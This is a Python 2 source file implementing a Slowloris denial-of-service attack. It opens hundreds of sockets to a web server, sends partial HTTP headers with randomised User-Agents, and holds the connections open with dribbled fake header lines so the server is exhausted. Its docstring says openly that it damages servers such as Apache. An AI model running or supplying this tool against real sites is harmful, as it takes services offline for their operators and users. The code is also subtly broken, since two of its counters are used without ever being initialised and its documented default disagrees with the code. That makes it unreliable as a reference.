#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
MIT License

Copyright (c) 2017 Maxim Krivich

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import sys
import time
import socket
import logging


from Queue import Queue
from threading import Thread
from random import randint, choice, shuffle
from fake_useragent import UserAgent, FakeUserAgentError


class SlowLoris(Thread):
    """
        SlowLoris this class implement a HTTP vulnerability and damage different https based web-servers like a
        Apache 1.x, Apache 2.x and etc.
        This class extends Thread that's mean you must launch in like a thread.(Thank you, captain Obvious!)
    """

    numberOfBuilders = 3

    def __init__(self, url, soc_cnt=600, port=80, headers={
        'User-Agent': None,  # UserAgent()
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'ru,en-us;q=0.7,en;q=0.3',
        'Accept-Charset': 'windows-1251,utf-8;q=0.7,*;q=0.7',
        'Connection': 'keep-alive'
    }):
        """
        :param url: link to web-server
        :param soc_cnt: maximum count of created socket default value 300
        :param port: default value 80
        :param headers: HTTP headers what puts in request
        """
        super(SlowLoris, self).__init__()
        self.url = url
        self.port = port
        if 0 > soc_cnt or soc_cnt > 1000:
            raise ValueError("Sockets count is to large {}".format(soc_cnt))
        self.soc_cnt = soc_cnt
        self.headers = headers
        try:
            self.fake_ua = UserAgent()
        except FakeUserAgentError as fe:
            logging.exception(fe.message)
            sys.exit(-1)
        self.__sockets = []
        self.__sended_request_cnt = 0

        self.is_stop = False

    def __del__(self):
        for con in self.__sockets:
            try:
                con.close()
            except Exception as e:
                logging.exception(e.message)
        del self.__sockets

    def __create_socket(self):
        while True:
            if self.__alive_socket_cnt <= self.soc_cnt:
                try:
                    res = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    res.settimeout(5)
                    res.connect((self.url, self.port))
                    res.send("GET /? {} HTTP/1.1\r\n".format(randint(0, 9999999)))
                    for k in self.headers.keys():
                        if k == "User-Agent":
                            self.headers[k] = str(self.fake_ua.random)
                        res.send("{key}:{value}\r\n".format(key=k, value=self.headers[k]))
                except Exception as e:
                    logging.exception(e.message)
                    pass
                else:
                    self.__sockets.append(res)
                    self.__alive_socket_cnt += 1

    def __send_request(self, q):
        while True:
            soc = q.get()
            try:
                soc.send("X-a: {} \r\n".format(randint(0, 9999999)))
                self.__sended_request_cnt += 1
            except socket.error:
                self.__sockets.remove(soc)
                self.__died_sockets_cnt += 1
                self.__alive_socket_cnt -= 1
            except Exception as e:
                logging.exception(e.message)
            finally:
                q.task_done()

    def kill(self):
        self.is_stop = True

    def run(self):
        for _ in xrange(self.numberOfBuilders):
            t = Thread(target=self.__create_socket)
            t.daemon = True
            t.start()

        while self.__alive_socket_cnt <= self.soc_cnt:
            time.sleep(1)

        self.__alive_socket_cnt = self.soc_cnt

        queue = Queue(self.soc_cnt * 2)

        for _ in xrange(self.numberOfBuilders):
            t = Thread(target=self.__send_request, args=(queue,))
            t.daemon = True
            t.start()

        while not self.is_stop:
            if self.__alive_socket_cnt <= self.soc_cnt:
                time.sleep(1)
            for s in self.__sockets[:self.soc_cnt]:
                queue.put(s)
                queue.join()

    def get_counters(self):
        return {"alive": self.__alive_socket_cnt, "died": self.__died_sockets_cnt,
                "requests": self.__sended_request_cnt}


if __name__ == "__main__":
    pass
